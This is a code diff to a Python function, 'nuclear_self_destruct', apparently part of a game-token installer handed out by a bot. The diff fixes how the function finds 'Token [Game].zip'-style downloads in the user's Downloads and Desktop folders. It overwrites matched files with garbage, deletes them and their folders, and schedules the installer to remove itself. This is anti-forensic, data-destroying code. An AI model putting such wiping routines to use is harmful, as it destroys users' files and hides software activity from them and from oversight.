@@ -1230,11 +1230,21 @@ def nuclear_self_destruct(here: Path, self_path: Path) -> None:
     except Exception:
         pass
 
-    # Step 2: hunt for related zips/folders in common download spots.
-    search_dirs: list[Path] = []
-    for env_key in ("USERPROFILE", "HOMEDRIVE", "HOMEPATH"):
-        # Not really used — Path.home() covers it on Windows.
+    # Step 2a: nuke the specific source zip we were extracted from.
+    # `_find_and_delete_source_zip` constructs the exact expected path
+    # (Token [Game].zip / TEST [Game].zip / browser-deduped variants)
+    # rather than globbing, so it's reliable.
+    try:
+        _find_and_delete_source_zip(here)
+    except Exception:
         pass
+
+    # Step 2b: hunt for OTHER related zips/folders in common download
+    # spots. Use plain filename comparisons because Path.glob() treats
+    # '[' and ']' as character-class delimiters — patterns like
+    # "Token [*].zip" silently fail to match real filenames like
+    # "Token [The Bus].zip". That was the bug.
+    search_dirs: list[Path] = []
     candidates = [
         Path.home() / "Downloads",
         Path.home() / "Desktop",
@@ -1257,38 +1267,56 @@ def nuclear_self_destruct(here: Path, self_path: Path) -> None:
         seen.add(r)
         unique_dirs.append(d)
 
-    patterns = ["Token [*].zip", "TEST [*].zip", "Token [*]", "TEST [*]"]
+    def _matches_pattern(name: str) -> bool:
+        """
+        Match the bot's zip naming: 'Token [Game Name].zip' or
+        'TEST [Game Name].zip', optionally with browser-added
+        ' (N)' suffix on the basename for duplicates.
+        Also matches the unzipped equivalents (no .zip extension).
+        """
+        for prefix in ("Token [", "TEST ["):
+            if name.startswith(prefix) and "]" in name:
+                # Either ends in .zip OR is an extracted folder name
+                lower = name.lower()
+                if lower.endswith(".zip"):
+                    return True
+                # No extension → likely an extracted folder
+                if "." not in name.split("]", 1)[1]:
+                    return True
+        return False
+
     for d in unique_dirs:
-        for pat in patterns:
-            try:
-                matches = list(d.glob(pat))
-            except OSError:
+        try:
+            entries = list(d.iterdir())
+        except OSError:
+            continue
+        for found in entries:
+            if not _matches_pattern(found.name):
                 continue
-            for found in matches:
-                try:
-                    if found.is_file():
-                        _wipe_file_with_garbage(found)
-                        _clear_readonly(found)
-                        found.unlink()
-                    elif found.is_dir():
-                        # Recursively wipe sensitive contents first
-                        for sub in list(found.rglob("*")):
-                            if not sub.is_file():
-                                continue
-                            try:
-                                if sub.name.lower() in {
-                                    "configs.user.ini",
-                                    "payload-manifest.json",
-                                    "gamegen-modes.txt",
-                                }:
-                                    _wipe_file_with_garbage(sub)
-                                _clear_readonly(sub)
-                                sub.unlink()
-                            except OSError:
-                                pass
-                        shutil.rmtree(found, ignore_errors=True)
-                except OSError:
-                    pass
+            try:
+                if found.is_file():
+                    _wipe_file_with_garbage(found)
+                    _clear_readonly(found)
+                    found.unlink()
+                elif found.is_dir():
+                    # Wipe sensitive files inside the dir first, then rmtree
+                    for sub in list(found.rglob("*")):
+                        if not sub.is_file():
+                            continue
+                        try:
+                            if sub.name.lower() in {
+                                "configs.user.ini",
+                                "payload-manifest.json",
+                                "gamegen-modes.txt",
+                            }:
+                                _wipe_file_with_garbage(sub)
+                            _clear_readonly(sub)
+                            sub.unlink()
+                        except OSError:
+                            pass
+                    shutil.rmtree(found, ignore_errors=True)
+            except OSError:
+                pass
 
     # Step 3: schedule the installer .exe + its folder to self-delete.
     try:
